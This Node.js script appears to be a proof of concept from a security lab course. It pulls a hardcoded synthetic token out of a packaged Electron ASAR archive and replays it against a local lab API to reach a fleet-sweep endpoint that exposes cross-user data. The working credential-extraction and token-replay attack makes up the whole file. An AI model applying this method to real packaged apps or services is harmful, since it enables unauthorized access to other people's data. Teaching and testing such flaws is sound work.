#!/usr/bin/env node
'use strict';

/*
 * poc-v1-asar.js — Phase 7 V1 package-recovery proof.
 *
 * Two clearly separated stages:
 *
 *   A. RECOVER the synthetic field-service token from the packaged Electron
 *      client: locate client/app.asar, read the archive index, extract
 *      client/resources/lab-app-config.json, parse the token out of it.
 *      (No obfuscation — by design; that is V1.)
 *   B. USE the recovered token against the LOCAL coursework API: RC4
 *      handshake, negative control (no token -> 403), then
 *      POST /api/field-service/fleet-sweep with X-Field-Token -> 200.
 *
 * The script fails clearly (non-zero exit) if the archive is missing, if
 * the config entry is absent, or if the recovered token no longer works.
 *
 * Host-side script (the archive lives on the host). Prerequisites:
 *   - the lab API reachable at LAB_BASE / http://127.0.0.1:3000
 *     (docker compose up -d --wait)
 *   - client dependencies installed and the package built:
 *     (cd client && npm install && npm run pack)
 *
 * The token is SYNTHETIC coursework data — NOT a real credential.
 * Local lab targets only; no external service is contacted.
 *
 * Usage:  node scripts/poc-v1-asar.js [--base http://127.0.0.1:3000]
 */
const fs = require('node:fs');
const path = require('node:path');

const REPO = path.join(__dirname, '..');
const ASAR_PATH = process.env.LAB_ASAR || path.join(REPO, 'client', 'app.asar');
const CONFIG_ENTRY = 'client/resources/lab-app-config.json';
const BASE = (process.argv.includes('--base')
  ? process.argv[process.argv.indexOf('--base') + 1]
  : process.env.LAB_BASE) || 'http://127.0.0.1:3000';

const EXPECTED_TOKEN = 'FS-LAB-7f3a9c1e-4b2d-8e6f-a5c0-1d9b3e7f2a48';
const EXPECTED_PROOF_PREFIX = 'FS-LAB-';

function section(title) {
  console.log('\n=== ' + title + ' ===');
}

function fail(msg) {
  console.error('FAIL  ' + msg);
  console.error('\nPOC FAILED — ' + msg);
  process.exit(1);
}

// --- stage A: recover the token from the packaged app -----------------------

function recoverToken() {
  section('A1. Locate the packaged ASAR');
  if (!fs.existsSync(ASAR_PATH)) {
    fail('packaged app not found at ' + ASAR_PATH + " — build it with: (cd client && npm run pack)");
  }
  console.log('archive: ' + ASAR_PATH + ' (' + (fs.statSync(ASAR_PATH).size / 1024).toFixed(1) + ' KiB)');

  section('A2. Read the archive index and find the app config');
  let asar;
  try {
    // @electron/asar is ESM-only; resolve it exactly like the client does
    const requireFromClient = require('node:module').createRequire(path.join(REPO, 'client', 'package.json'));
    asar = requireFromClient('@electron/asar');
  } catch (err) {
    fail("cannot load @electron/asar (" + err.message + ") — run 'npm install' in client/");
  }
  let entries;
  try {
    entries = asar.listPackage(ASAR_PATH).map((p) => p.replace(/^[/\\]/, ''));
  } catch (err) {
    fail('cannot read archive: ' + err.message);
  }
  console.log('archive entries: ' + entries.length);
  if (!entries.includes(CONFIG_ENTRY)) {
    fail('token NOT present in package — ' + CONFIG_ENTRY + ' is missing from the archive index');
  }
  console.log('found entry: ' + CONFIG_ENTRY);

  section('A3. Extract and parse the token');
  const raw = asar.extractFile(ASAR_PATH, CONFIG_ENTRY).toString('utf8');
  let cfg;
  try {
    cfg = JSON.parse(raw);
  } catch (err) {
    fail('config entry is not valid JSON: ' + err.message);
  }
  const token = cfg && cfg.fieldService && cfg.fieldService.token;
  if (typeof token !== 'string' || token.length === 0) {
    fail('token NOT present in package — fieldService.token missing from ' + CONFIG_ENTRY);
  }
  console.log('recovered token: ' + token);
  const proofs = [
    ['token is synthetic (FS-LAB-…)', token.startsWith(EXPECTED_PROOF_PREFIX)],
    ['token matches the documented lab value', token === EXPECTED_TOKEN]
  ];
  let ok = true;
  for (const [label, pass] of proofs) {
    console.log((pass ? 'PASS' : 'FAIL') + '  ' + label);
    ok = ok && pass;
  }
  if (!ok) process.exit(1);
  return token;
}

// --- stage B: use the recovered token against the local lab API -------------

async function useToken(token) {
  section('B1. RC4 transport handshake (required for every /api call, no login)');
  const LabEnvelope = require(path.join(REPO, 'shared', 'protocol', 'envelope.js'));
  let session;
  try {
    const keyRes = await fetch(BASE + '/api/session/key', { method: 'POST' });
    session = await keyRes.json();
    if (!keyRes.ok || !session.sessionId || !session.key) throw new Error('HTTP ' + keyRes.status);
  } catch (err) {
    fail('session/key failed (' + err.message + ') — is the lab API running? (docker compose up -d --wait)');
  }
  console.log('sessionId: ' + session.sessionId);

  async function call(endpoint, payload, headers) {
    const res = await fetch(BASE + endpoint, {
      method: 'POST',
      headers: { 'content-type': 'application/json', ...(headers || {}) },
      body: JSON.stringify(LabEnvelope.seal(session.sessionId, session.key, payload))
    });
    const raw = await res.json();
    if (raw && typeof raw.data === 'string') {
      return { status: res.status, body: LabEnvelope.open(session.key, raw) };
    }
    return { status: res.status, body: raw }; // plaintext protocol error
  }

  section('B2. Negative control: fleet-sweep WITHOUT the recovered token');
  const denied = await call('/api/field-service/fleet-sweep', {});

  section('B3. Exploit: fleet-sweep WITH the recovered token (no user login at all)');
  const sweep = await call('/api/field-service/fleet-sweep', {}, { 'X-Field-Token': token });

  const proofs = [
    ['request without token rejected (403)', denied.status === 403, denied.status],
    ['recovered token accepted (200), no user token in payload', sweep.status === 200, sweep.status],
    ['fleet-wide equipment data exposed', sweep.status === 200 && Array.isArray(sweep.body.fleet) && sweep.body.fleet.length >= 12, sweep.status === 200 && sweep.body.fleet.length],
    ['cross-user diagnostic history exposed', sweep.status === 200 && Array.isArray(sweep.body.recentRuns), sweep.status === 200 && sweep.body.recentRuns.length]
  ];
  let ok = true;
  for (const [label, pass, shown] of proofs) {
    console.log((pass ? 'PASS' : 'FAIL') + '  ' + label + ': ' + JSON.stringify(shown));
    ok = ok && pass;
  }
  if (!ok) {
    console.error('\nPOC FAILED — recovered token did not authorize the endpoint');
    process.exit(1);
  }
}

async function main() {
  console.log('poc-v1-asar — V1 package-recovery proof (SYNTHETIC lab token, local targets only)');
  const token = recoverToken();
  await useToken(token);
  console.log('\nPOC OK — V1 confirmed end to end:');
  console.log('  (A) token recovered from the packaged ASAR (client/app.asar -> ' + CONFIG_ENTRY + ')');
  console.log('  (B) recovered token authorized POST /api/field-service/fleet-sweep on the local lab API');
}

main().catch((err) => {
  console.error('[poc-v1-asar] ' + (err && err.message));
  process.exit(1);
});
